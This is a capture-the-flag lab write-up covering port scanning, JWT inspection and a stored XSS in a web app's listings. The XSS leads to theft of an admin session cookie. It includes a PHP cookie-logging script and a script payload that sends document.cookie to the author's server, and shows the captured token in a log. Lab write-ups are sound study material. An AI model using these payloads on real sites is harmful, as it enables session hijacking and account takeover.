# Flag 1
- Started rustnscan and scanned for ports

```console
❯ rustscan -a 10.10.171.76 --ulimit 5000 -- -sC -sV | tee rustscan.log
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Real hackers hack time ⌛

[~] The config file is expected to be at "/home/divu050704/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 10.10.171.76:22
Open 10.10.171.76:80
Open 10.10.171.76:32768
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-30 19:20 IST
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 19:20
Completed NSE at 19:20, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 19:20
Completed NSE at 19:20, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 19:20
Completed NSE at 19:20, 0.00s elapsed
Initiating Ping Scan at 19:20
Scanning 10.10.171.76 [2 ports]
Completed Ping Scan at 19:20, 3.00s elapsed (1 total hosts)
Nmap scan report for 10.10.171.76 [host down, received no-response]
NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 19:20
Completed NSE at 19:20, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 19:20
Completed NSE at 19:20, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 19:20
Completed NSE at 19:20, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn
Nmap done: 1 IP address (0 hosts up) scanned in 3.86 seconds
```

- Checked out port 80 manually and simultaneously started a `gobuster` scan.
- Signed up and logged in as a test account.
- On checking cookie the token seems to `JWT`, decoded it from [here](https://jwt.io/)

```json
{
  "userId": 4,
  "username": "test",
  "admin": false,
  "iat": 1669816203
}
```

- Tried changing admin and as true, but no success.
- Then a found `XSS`, While creating a new listing.
- Used the following payload to initiate an alert

```html
</h1><script>alert(1)</script>
```
- Got an alert.
- We can also  grab the token for admin by `CSRF`.
- Got a php code to steal cookie from a user 

```php
<?php

	$cookie = $_GET["token"];
	$file = fopen('cookielog.txt', 'a');
	fwrite($file, $cookie . "\n\n");
?>
```

- Started http server on my machine with python under the directory with php code.
- Made a new listing with heading

```html
</h1><script>document.location= "http://10.17.0.215/cookiegrab.php?token=" + document.cookie;</script>
```

- Reported it and got the token 

```console
❯ sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.171.76 - - [30/Nov/2022 20:23:51] "GET /cookiegrab.php?token=token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjIsInVzZXJuYW1lIjoibWljaGFlbCIsImFkbWluIjp0cnVlLCJpYXQiOjE2Njk4MjAwMzN9.rlplmkuWntI6i1WzVsqadDxj3drI4_vPdgPY3tJwTIE HTTP/1.1" 200 -
```

- Used this cookie to access admin directory we got from gobuster

```console
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.171.76
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/11/30 19:30:09 Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 153]
/.htaccess            (Status: 403) [Size: 153]
/.htpasswd            (Status: 403) [Size: 153]
/Admin                (Status: 403) [Size: 392]
/admin                (Status: 403) [Size: 392]
/ADMIN                (Status: 403) [Size: 392]
/images               (Status: 301) [Size: 179] [--> /images/]
/login                (Status: 200) [Size: 857]
/Login                (Status: 200) [Size: 857]
/messages             (Status: 302) [Size: 28] [--> /login]
/new                  (Status: 302) [Size: 28] [--> /login]
/robots.txt           (Status: 200) [Size: 31]
/signup               (Status: 200) [Size: 667]
/stylesheets          (Status: 301) [Size: 189] [--> /stylesheets/]
===============================================================
2022/11/30 19:31:20 Finished
===============================================================
```

- Got the flag

![alt](https://github.com/divu050704/assets-holder/raw/main/tryhackme-screenshots/24.png)
